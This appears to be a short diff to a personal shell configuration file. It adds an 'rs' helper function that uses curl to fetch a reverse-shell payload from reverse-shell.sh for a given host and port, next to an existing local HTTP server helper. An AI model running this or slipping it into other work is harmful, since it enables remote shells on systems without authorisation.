@@ -108,3 +108,7 @@ p() {
 server() {
         python3 -m http.server $1
 }
+
+rs() {
+        curl https://reverse-shell.sh/$1:$2
+}
